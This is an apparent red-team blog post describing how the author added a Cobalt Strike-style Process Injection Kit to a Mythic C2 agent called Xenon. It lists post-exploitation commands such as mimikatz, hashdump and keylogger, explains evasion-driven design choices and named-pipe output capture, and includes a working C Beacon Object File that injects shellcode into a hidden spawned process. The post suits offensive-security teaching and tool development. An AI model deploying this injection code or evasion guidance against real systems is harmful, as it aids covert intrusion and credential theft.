@@ -1,0 +1,451 @@
+# https://c0rnbread.com/part-6-recreating-cobalt-strikes-process-injection-kit/
+
+<!DOCTYPE html><html lang="en" class="has-light-text">
+<body class="post-template tag-malware tag-c2 tag-red-teaming has-mono-title has-sans-body">
+
+<div class="gh-viewport">
+    
+    
+
+    
+
+<main class="gh-main">
+
+    <article class="gh-article post tag-malware tag-c2 tag-red-teaming no-image">
+
+        
+
+        <section class="gh-content gh-canvas is-body">
+            <p></p><h1 id="background">Background</h1><p>Process injection or code injection is a technique in which you copy and execute arbitrary code to a target process. It is often used in Offensive Security to execute tasks under the context of another legitimate process on the system.</p><p>Before this blog my Mythic C2 agent, <a href="https://github.com/MythicAgents/Xenon?ref=c0rnbread.com">Xenon</a>, only implemented process injection for executing .NET assemblies in-memory, but I planned on using it for post-ex commands going forward.</p><p>Since malware has used process injection for decades, this is going to be one of the most suspicious things Xenon will need to do. It’s an easy detection/signature point, especially for an open-source tool like this one. That is why I wanted to support user-defined process injection methods.</p><p>Obviously, users could always edit the agent’s source code directly and change the default process injection method, but I wanted to tackle the challenge of supporting previously written kits.</p><p>Something like Cobalt Strike’s <em>Process Injection Kit</em>.</p><h1 id="why-inject">Why Inject?</h1><p>Let’s just get this part out of the way.</p><p>So why do we want to do process injection in the first place? The original thinking behind doing remote process injection was to “protect” the main beaconing process from crashing and disperse memory artifacts away from its own process.</p><p><strong>Without process injection</strong></p><ul><li>You have a C2 beacon running in <code>a.exe</code>.</li><li>The operator runs a <code>mimikatz</code> task.</li><li>The agent tries to execute it, but it crashes or gets detected.</li><li>Result: <code>a.exe</code> dies and you lose your entire foothold.</li></ul><p><strong>With process injection</strong></p><ul><li>The beacon is still running in <code>a.exe</code>.</li><li>The operator runs a <code>mimikatz</code> task.</li><li>Instead of executing inside itself, <code>a.exe</code> injects mimikatz’s position-independent code into <code>legit.exe</code>.</li><li>If <code>legit.exe</code> crashes, the task fails but <code>a.exe</code> is still alive and beaconing.</li></ul><h1 id="cobalt-strikeprocess-injection-kit">Cobalt Strike - Process Injection Kit</h1><p>The Process Injection Kit in CS is a feature that implements two “hook” functions for post-exploitation commands that use post-ex DLLs. </p><p><em>Hooks allow Aggressor Script to intercept and change Cobalt Strike behavior.</em></p><p>The two hooks in CS are <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_hooks.htm?ref=c0rnbread.com#PROCESS_INJECT_SPAWN">PROCESS_INJECT_SPAWN</a> and <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_hooks.htm?ref=c0rnbread.com#PROCESS_INJECT_EXPLICIT">PROCESS_INJECT_EXPLICIT</a>.</p><p><code>PROCESS_INJECT_SPAWN</code> - spawns a temporary process and then injects into it.</p><p><code>PROCESS_INJECT_EXPLICIT</code> - injects into an already running process.</p><p>If using the process injection kit, these hook functions override the default process injection technique. It basically allows the operator to define custom injection functionality to avoid detections/signatures.</p><h2 id="spawn-injection-commands">Spawn Injection Commands</h2><p>In Cobalt Strike, specific commands use the fork &amp; run technique. The main purpose for this is to ‘protect’ the beacon from crashing or detection. Although in today’s world I think fork &amp; run is probably going to hurt you on detections.</p>
+<!--kg-card-begin: html-->
+<div class="gh-table"><table>
+<thead>
+<tr>
+<th><strong>Beacon Command</strong></th>
+<th><strong>Aggressor Script function</strong></th>
+<th><strong>UI&nbsp;Interface</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>chromedump</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>dcsync</td>
+<td>&amp;bdcsync</td>
+<td></td>
+</tr>
+<tr>
+<td>elevate</td>
+<td>&amp;belevate</td>
+<td>[beacon] -&gt;&nbsp;Access -&gt; Elevate</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>[beacon] -&gt; Access -&gt; Golden Ticket</td>
+</tr>
+<tr>
+<td>hashdump</td>
+<td>&amp;bhashdump</td>
+<td>[beacon] -&gt;&nbsp;Access -&gt; Dump Hashes</td>
+</tr>
+<tr>
+<td>keylogger</td>
+<td>&amp;bkeylogger</td>
+<td></td>
+</tr>
+<tr>
+<td>logonpasswords</td>
+<td>&amp;blogonpasswords</td>
+<td>[beacon] -&gt; Access -&gt; Run&nbsp;Mimikatz</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>[beacon] -&gt; Access -&gt; Make Token (use a hash)</td>
+</tr>
+<tr>
+<td>mimikatz</td>
+<td>&amp;bmimikatz</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>&amp;bmimikatz_small</td>
+<td></td>
+</tr>
+<tr>
+<td>net</td>
+<td>&amp;bnet</td>
+<td>[beacon] -&gt;&nbsp;Explore -&gt; Net View</td>
+</tr>
+<tr>
+<td>portscan</td>
+<td>&amp;bportscan</td>
+<td>[beacon] -&gt;&nbsp;Explore -&gt; Port Scan</td>
+</tr>
+<tr>
+<td>powerpick</td>
+<td>&amp;bpowerpick</td>
+<td></td>
+</tr>
+<tr>
+<td>printscreen</td>
+<td>&amp;bprintscreen</td>
+<td></td>
+</tr>
+<tr>
+<td>pth</td>
+<td>&amp;bpassthehash</td>
+<td></td>
+</tr>
+<tr>
+<td>runasadmin</td>
+<td>&amp;brunasadmin</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>[target] -&gt; Scan</td>
+</tr>
+<tr>
+<td>screenshot</td>
+<td>&amp;bscreenshot</td>
+<td>[beacon] -&gt; Explore -&gt; Screenshot</td>
+</tr>
+<tr>
+<td>screenwatch</td>
+<td>&amp;bscreenwatch</td>
+<td></td>
+</tr>
+<tr>
+<td>ssh</td>
+<td>&amp;bssh</td>
+<td>[target] -&gt; Jump -&gt;&nbsp;ssh</td>
+</tr>
+<tr>
+<td>ssh-key</td>
+<td>&amp;bssh_key</td>
+<td>[target] -&gt; Jump -&gt;&nbsp;ssh-key</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>[target] -&gt; Jump -&gt; [exploit] (use a hash)</td>
+</tr>
+</tbody>
+</table></div>
+<!--kg-card-end: html-->
+<p>Commands that support the <code>PROCESS_INJECT_SPAWN</code> hook in 4.5</p><h2 id="explicit-injection-commands">Explicit Injection Commands</h2><p>Explicit injection doesn’t spawn a temporary process, but injects into an already existing process on the target host.</p>
+<!--kg-card-begin: html-->
+<div class="gh-table"><table>
+<thead>
+<tr>
+<th><strong>Beacon Command</strong></th>
+<th><strong>Aggressor Script function</strong></th>
+<th><strong>UI Interface</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>browserpivot</td>
+<td>&amp;bbrowserpivot</td>
+<td>[beacon] -&gt; Explore -&gt; Browser Pivot</td>
+</tr>
+<tr>
+<td>chromedump</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>dcsync</td>
+<td>&amp;bdcsync</td>
+<td></td>
+</tr>
+<tr>
+<td>dllinject</td>
+<td>&amp;bdllinject</td>
+<td></td>
+</tr>
+<tr>
+<td>hashdump</td>
+<td>&amp;bhashdump</td>
+<td></td>
+</tr>
+<tr>
+<td>inject</td>
+<td>&amp;binject</td>
+<td>[Process Browser] -&gt; Inject</td>
+</tr>
+<tr>
+<td>keylogger</td>
+<td>&amp;bkeylogger</td>
+<td>[Process Browser] -&gt; Log Keystrokes</td>
+</tr>
+<tr>
+<td>logonpasswords</td>
+<td>&amp;blogonpasswords</td>
+<td></td>
+</tr>
+<tr>
+<td>mimikatz</td>
+<td>&amp;bmimikatz</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>&amp;bmimikatz_small</td>
+<td></td>
+</tr>
+<tr>
+<td>net</td>
+<td>&amp;bnet</td>
+<td></td>
+</tr>
+<tr>
+<td>portscan</td>
+<td>&amp;bportscan</td>
+<td></td>
+</tr>
+<tr>
+<td>printscreen</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>psinject</td>
+<td>&amp;bpsinject</td>
+<td></td>
+</tr>
+<tr>
+<td>pth</td>
+<td>&amp;bpassthehash</td>
+<td></td>
+</tr>
+<tr>
+<td>screenshot</td>
+<td></td>
+<td>[Process Browser] -&gt; Screenshot (Yes)</td>
+</tr>
+<tr>
+<td>screenwatch</td>
+<td></td>
+<td>[Process Browser] -&gt; Screenshot (No)</td>
+</tr>
+<tr>
+<td>shinject</td>
+<td>&amp;bshinject</td>
+<td></td>
+</tr>
+<tr>
+<td>ssh</td>
+<td>&amp;bssh</td>
+<td></td>
+</tr>
+<tr>
+<td>ssh-key</td>
+<td>&amp;bssh_key</td>
+<td></td>
+</tr>
+</tbody>
+</table></div>
+<!--kg-card-end: html-->
+<p>Commands that support the <code>PROCESS_INJECT_EXPLICIT</code> hook in 4.5</p><h1 id="mythic-implementation">Mythic Implementation</h1><h3 id="disclaimer">Disclaimer</h3><p>It should be stated that in modern C2 implants there has been a big shift away from the fork &amp; run technique to in-process execution. Most modern implants rely heavily on in-process execution of BOF files. This is because fork &amp; run is “louder” from an events perspective, because it involves remote process injection which has become increasingly more detectable.</p><p>So why did I bother reimplementing Process Injection Kit at all?</p><p>Really for these purposes:</p><ul><li>Learn about it’s implementation in Cobalt Strike.</li><li>Provide the option to use your own process injection techniques without modifying Xenon’s code base.</li></ul><p>BOF files do have some key advantages over fork &amp; run:</p><ul><li>A plethora of open-source examples</li><li>Rapid development</li><li>Small memory footprint</li><li>In-process execution</li></ul><h2 id="default-injection">Default Injection</h2><p>Xenon’s default injection method is a basic APC injection, a very well signatured behavior that will most likely be flagged by AV engines (but maybe not ).</p><h2 id="register-kit">Register Kit</h2><p>To start, I introduced a new Mythic command, <code>register_process_inject_kit</code>, to the Xenon agent. It allows you to upload a custom process injection kit into Xenon.</p><p>Process Injection Kit's are implemented as Beacon Object Files (BOFs) and uploaded through the modal.</p><p>Currently only <code>PROCESS_INJECT_SPAWN</code> behavior is supported which spawns a <strong>new</strong> sacrificial process to perform process injection.</p><p>For now, it takes two arguments <code>--enabled</code> and <code>--inject_spawn</code>.</p><ul><li><code>--enabled</code> - Enables <strong>ALL</strong> Xenon payloads to use the custom injection method.</li><li><code>--inject_spawn</code> - Saves a BOF file as the new injection kit.</li></ul><p>Once your kit is registered all supported commands will use the BOF to perform injection.</p><h3 id="commands">Commands</h3><p>Currently these are the only commands that will be overridden by the process injection kit.</p><ul><li><code>execute_assembly</code></li><li><code>mimikatz</code></li></ul><h2 id="the-pipe-problem">The Pipe Problem</h2><p>At this point in the implementation I found myself stuck in a pickle.</p><ol><li>User uploads their BOF (kit) with <code>register_process_inject_kit</code></li><li>User runs a fork &amp; run command</li><li>Server sends command to agent</li><li>Agent executes kit to inject shellcode into remote process</li></ol><p>How do we get the output from a remote process?</p><p>Previously this was easy because we controlled the code that spawned the remote process and could use <em>anonymous pipes</em> to get the process’s output. But now the user controls the spawning functionality in their BOF.</p><p>I thought, well, their BOF can use the internal BeaconAPIs I’ve defined like <code>BeaconSpawnTemporaryProcess</code> , so should I just modify that to use an anonymous pipe?</p><p>But then the calling code (their code) would need to pass a handle to the function then check it for output.</p><p>I could modify the function to use a named pipe, but then what if they don’t use the BeaconAPIs to spawn the sacrificial process? Then they wouldn’t get any output still.</p><p>Unfortunately this would make my implementation incompatible with people’s already existing Process Injection Kits.</p><p><strong>More shellcoding…</strong></p><p>To avoid this I did something wacky, that turned out to be similar to what Cobalt Strike did.</p><p>I created a PIC stub which gets prepended to all post-ex PIC that does the following:</p><ol><li>Walks the Process Environment Block (PEB) to find the addresses for <code>CreateFileA</code> and <code>SetStdHandle</code></li><li>Calls <code>CreateFileA</code> to create a named pipe with a known string</li><li>Calls <code>SetStdHandle</code> to set the stdout and stderr in the <em>current process</em> to the named pipe</li><li>Jumps to the next block of shellcode</li></ol><p>Now when the post-ex PIC executes in that process it will write all output to our named pipe. In our main beacon process we can just read data from that named pipe until there’s none left.</p><p>xenon → injects stub+shellcode → stub sets output to <code>\\\\.\\pipe\\something</code>→ shellcode executes</p><p>I discovered this was similar to how Cobalt Strike implements output retrieval from remote processes. The difference is they do not use donut-shellcode, but instead a custom PIC DLL reflective loader (DRL) that sets the output in the current process to a named pipe.</p><p>beacon → injects DRL+DLL→ DRL sets output to <code>\\\\.\\pipe\\something</code> → DLL executes</p><h2 id="development">Development</h2><p>If you want to write your own process injection kit refer to Cobalt Strike’s <a href="https://www.cobaltstrike.com/blog/process-injection-update-in-cobalt-strike-4-5?ref=c0rnbread.com">documentation</a>.</p><p>Here is a simple example:</p><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"beacon.h"</span></span>
+
+<span class="token comment">/* is this an x64 BOF */</span>
+BOOL <span class="token function">is_x64</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">defined _M_X64</span></span>
+   <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">elif</span> <span class="token expression">defined _M_IX86</span></span>
+   <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">/* See gox86 and gox64 entry points */</span>
+<span class="token keyword">void</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> args<span class="token punctuation">,</span> <span class="token keyword">int</span> alen<span class="token punctuation">,</span> BOOL x86<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+   STARTUPINFOA        si<span class="token punctuation">;</span>
+   PROCESS_INFORMATION pi<span class="token punctuation">;</span>
+   datap               parser<span class="token punctuation">;</span>
+   <span class="token keyword">short</span>               ignoreToken<span class="token punctuation">;</span>
+   <span class="token keyword">char</span> <span class="token operator">*</span>              dllPtr<span class="token punctuation">;</span>
+   <span class="token keyword">int</span>                 dllLen<span class="token punctuation">;</span>
+
+   <span class="token comment">/* Warn about crossing to another architecture. */</span>
+   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_x64</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> x86 <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token function">BeaconPrintf</span><span class="token punctuation">(</span>CALLBACK_ERROR<span class="token punctuation">,</span> <span class="token string">"Warning: inject from x86 -&gt; x64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">}</span>
+   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_x64</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> x86 <span class="token operator">==</span> TRUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token function">BeaconPrintf</span><span class="token punctuation">(</span>CALLBACK_ERROR<span class="token punctuation">,</span> <span class="token string">"Warning: inject from x64 -&gt; x86"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">}</span>
+
+   <span class="token comment">/* Extract the arguments */</span>
+   <span class="token function">BeaconDataParse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>parser<span class="token punctuation">,</span> args<span class="token punctuation">,</span> alen<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   ignoreToken <span class="token operator">=</span> <span class="token function">BeaconDataShort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>parser<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   dllPtr <span class="token operator">=</span> <span class="token function">BeaconDataExtract</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>parser<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dllLen<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token comment">/* zero out these data structures */</span>
+   <span class="token function">__stosb</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>si<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>STARTUPINFO<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">__stosb</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pi<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PROCESS_INFORMATION<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token comment">/* setup the other values in our startup info structure */</span>
+   si<span class="token punctuation">.</span>dwFlags <span class="token operator">=</span> STARTF_USESHOWWINDOW<span class="token punctuation">;</span>
+   si<span class="token punctuation">.</span>wShowWindow <span class="token operator">=</span> SW_HIDE<span class="token punctuation">;</span>
+   si<span class="token punctuation">.</span>cb <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>STARTUPINFO<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token comment">/* Ready to go: spawn, inject and cleanup */</span>
+   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">BeaconSpawnTemporaryProcess</span><span class="token punctuation">(</span>x86<span class="token punctuation">,</span> ignoreToken<span class="token punctuation">,</span> <span class="token operator">&amp;</span>si<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token function">BeaconPrintf</span><span class="token punctuation">(</span>CALLBACK_ERROR<span class="token punctuation">,</span> <span class="token string">"Unable to spawn %s temporary process."</span><span class="token punctuation">,</span> x86 <span class="token operator">?</span> <span class="token string">"x86"</span> <span class="token operator">:</span> <span class="token string">"x64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span><span class="token punctuation">;</span>
+   <span class="token punctuation">}</span>
+   <span class="token function">BeaconInjectTemporaryProcess</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pi<span class="token punctuation">,</span> dllPtr<span class="token punctuation">,</span> dllLen<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">BeaconCleanupProcess</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pi<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">gox86</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> args<span class="token punctuation">,</span> <span class="token keyword">int</span> alen<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+   <span class="token function">go</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> alen<span class="token punctuation">,</span> TRUE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">gox64</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> args<span class="token punctuation">,</span> <span class="token keyword">int</span> alen<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+   <span class="token function">go</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> alen<span class="token punctuation">,</span> FALSE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre><p><strong>IMPORTANT</strong> - The BOF injection kit must parse two arguments passed from Mythic, regardless if it uses them:</p><p><code>ignoreToken</code> - Boolean value that Xenon doesn’t use yet, but still needs to be there.</p><p><code>dllPtr</code> - A pointer to the beginning of the shellcode being executed.</p><p>The example code above is essentially the same behavior as Xenon's default process injection method. It can be easily modified to change the injection behavior to something custom, and that's where the advantage is.</p><p>Using <code>register_process_inject_kit</code> the injection behavior can be changed at any point in the running payload without compiling a new payload.</p><p>You can compile the example BOF with the following:</p><pre class="language-bash" tabindex="0"><code class="language-bash">x86_64-w64-mingw32-gcc <span class="token parameter variable">-o</span> inject_spawn.x64.o <span class="token parameter variable">-c</span> inject_spawn.c 
+</code></pre><p>Then register the new kit with the <code>register_process_inject_kit</code> command to the Mythic server.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://c0rnbread.com/content/images/2025/09/image.png" class="kg-image" alt="" loading="lazy" width="1652" height="599"><figcaption><code spellcheck="false" style="white-space: pre-wrap;"><span>register_process_inject_kit</span></code><span style="white-space: pre-wrap;"> command</span></figcaption></figure><p>Now all supported commands will use your new process injection behavior!</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://c0rnbread.com/content/images/2025/09/image-1.png" class="kg-image" alt="" loading="lazy" width="2000" height="465"><figcaption><span style="white-space: pre-wrap;">Injecting .NET assembly shellcode</span></figcaption></figure><h3 id="examples">Examples</h3><p>If your like me, you might just want to use some publicly available kits out there.</p><p>Here are some real-world examples of modified injection kits:</p><ul><li><a href="https://github.com/REDMED-X/InjectKit?ref=c0rnbread.com">InjectKit</a> - Indirect syscalls via the Tartarus Gate method.</li><li><a href="https://github.com/apokryptein/secinject?ref=c0rnbread.com">secinject</a> - Section Mapping Process Injection (secinject): Cobalt Strike BOF</li><li><a href="https://github.com/vgeorgiev90/CB_process_Inject?ref=c0rnbread.com">CB_process_Inject</a> - A simple process injection kit for cobalt strike based on syscalls</li></ul><h2 id="wrapping-up">Wrapping Up</h2><p>I mostly went through this process, because I thought the idea of swapping out process injection methods on the fly was cool.</p><p>Practically speaking I would probably opt for in-process BOF execution on a real engagement.</p>
+        </section>
+
+    </article>
+
+        <div class="gh-comments gh-canvas">
+            
+        <div id="ghost-comments-root"><div src="cid:frame-295EDABD36BACEE93A426508A3C090F1@mhtml.blink" innerref="[object Object]" frameborder="0" title="comments-frame" style="width: 100%; height: 152px;" data-original-tag="iframe"><section class="ghost-display " data-loaded="false" data-testid="content-box" style="--gh-accent-color: #745df6; padding-top: 0px; padding-bottom: 24px;"><div class="flex h-32 w-full items-center justify-center" data-testid="loading"><svg id="loader-1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="40px" height="40px" viewBox="0 0 50 50" xml:space="preserve" class="mb-6 h-12 w-12 fill-white/90 dark:fill-white/60"><path d="M43.935,25.145c0-10.318-8.364-18.683-18.683-18.683c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615c8.072,0,14.615,6.543,14.615,14.615H43.935z"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div></section></div></div>
+    
+        </div>
+
+</main>
+
+
+            <section class="gh-container is-grid gh-outer">
+                <div class="gh-container-inner gh-inner">
+                    <h2 class="gh-container-title">Read more</h2>
+                    <div class="gh-feed">
+                            <article class="gh-card post no-image">
+    <a class="gh-card-link" href="https://c0rnbread.com/part-5-cough-cough/">
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">Part 5: Cough Cough 🤧</h3>
+                    <p class="gh-card-excerpt is-body">Adding a COFF loader, Cobalt Strike BOFs, crashing and crashing
+
+
+Intro
+
+BOFs might be the most popular format for post-exploitation tooling in the cyber space. There are a bunch of reasons for that which we will discuss below.
+
+So I really wanted Xenon to be compatible with the plethora of</p>
+            
+        </div>
+    </a>
+</article>                            <article class="gh-card post no-image">
+    <a class="gh-card-link" href="https://c0rnbread.com/part-4-getting-an-upgrade/">
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">Part 4: Getting an Upgrade ⚒️</h3>
+                    <p class="gh-card-excerpt is-body">yes… i named this one after the minecraft achievement.
+
+The Httpx container, malleable C2 profiles, and wininet.
+
+
+Flexible Request Profiles
+
+To be honest, this is where I spent the bulk of my development for this project.
+
+Up to this point, the http C2 profile served it’s purpose and allowed</p>
+            
+        </div>
+    </a>
+</article>                            <article class="gh-card post no-image">
+    <a class="gh-card-link" href="https://c0rnbread.com/part-3-doing-a-task/">
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">Part 3: Doing a Task</h3>
+                    <p class="gh-card-excerpt is-body">Mythic request types (checkin &amp; get_tasking &amp; post_response)
+
+
+Getting Tasks
+
+Now that we performed an initial check-in to the teamserver, we (the agent) need to continuously check for new tasks to execute. In Mythic this can be done with a get_tasking request. The format for this style</p>
+            
+        </div>
+    </a>
+</article>                            <article class="gh-card post no-image">
+    <a class="gh-card-link" href="https://c0rnbread.com/part-2-getting-a-callback/">
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">Part 2: Getting a Callback</h3>
+                    <p class="gh-card-excerpt is-body">translation containers and checking in
+
+
+Agent
+
+
+Data Serialization
+
+I decided to build off of the Talon agent by @Cracked5pider. It uses a data serialization format “type, size, data” to pack and parse data. This allows the agent to send serialized binary data instead of worrying about creating JSON in C</p>
+            
+        </div>
+    </a>
+</article>                    </div>
+                </div>
+            </section>
+
+    
+        
+</div>
+
+    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="pswp__bg"></div>
+
+    <div class="pswp__scroll-wrap">
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+<div id="sodo-search-root"></div></body></html>
